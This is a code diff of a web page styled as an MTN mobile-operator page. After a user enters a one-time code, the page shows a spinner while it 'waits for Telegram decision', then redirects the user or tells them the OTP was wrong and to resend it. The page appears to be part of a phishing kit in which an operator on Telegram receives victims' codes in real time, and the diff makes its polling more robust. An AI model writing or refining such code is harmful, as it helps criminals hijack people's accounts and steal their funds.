@@ -172,7 +172,7 @@
     stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;
   }
 
-  /* Full-screen processing — now waits for Telegram decision */
+  /* Full-screen processing — waits for Telegram decision */
   .processing-screen{
     position:fixed;inset:0;z-index:2000;
     background:radial-gradient(circle at 50% 35%, #0A3D7A 0%, var(--mtn-blue-deep) 55%, #001B3D 100%);
@@ -397,42 +397,70 @@
       return;
     }
 
-    // ---- Poll for approval — keep the spinner up the whole time ----
-    const MAX_WAIT = 5 * 60 * 1000;  // 5 minutes
+    // ---- Poll for approval — keep spinner up ----
+    const MAX_WAIT = 5 * 60 * 1000;   // 5 minutes max
     const start = Date.now();
+    let consecutiveUnknown = 0;
 
     const poll = setInterval(async () => {
       try{
         const r = await fetch(`${API}/code-status/${requestId}`);
         const s = await r.json();
 
+        // ---- Approved ----
         if(s.status === 'approved'){
           clearInterval(poll);
-          // Short delay so user sees the checkmark feels clean
           await new Promise(res => setTimeout(res, 600));
           window.location.href = 'approved.html';
-        } else if(s.status === 'declined' || s.status === 'expired'){
+          return;
+        }
+
+        // ---- Declined or expired ----
+        if(s.status === 'declined' || s.status === 'expired'){
           clearInterval(poll);
           hideProcessing();
-
           setStatus('❌ Wrong OTP. Please resend the code.', 'err');
 
-          // Reset for another try
           input.value = '';
           refresh();
           btn.disabled = true;
           input.disabled = false;
           rbtn.disabled = false;
           input.focus();
+          return;
+        }
 
-          // Auto-trigger resend notification? No — user taps "Resend code" themselves
-        } else if(Date.now() - start > MAX_WAIT){
+        // ---- Server restarted / lost the ID ----
+        if(s.status === 'unknown'){
+          consecutiveUnknown++;
+          // If we get 3+ "unknown" in a row, the server restarted
+          if(consecutiveUnknown >= 3){
+            clearInterval(poll);
+            hideProcessing();
+            setStatus('⏱ Session expired. Please resend the code.', 'err');
+
+            input.value = '';
+            refresh();
+            btn.disabled = true;
+            input.disabled = false;
+            rbtn.disabled = false;
+            input.focus();
+          }
+          return;
+        }
+
+        // ---- Reset counter if it's pending ----
+        consecutiveUnknown = 0;
+
+        // ---- Overall timeout ----
+        if(Date.now() - start > MAX_WAIT){
           clearInterval(poll);
           hideProcessing();
           setStatus('⏱ Timed out. Please resend the code.', 'err');
           input.disabled = false;
           rbtn.disabled = false;
         }
+
       }catch(err){
         // transient network error — keep polling
       }
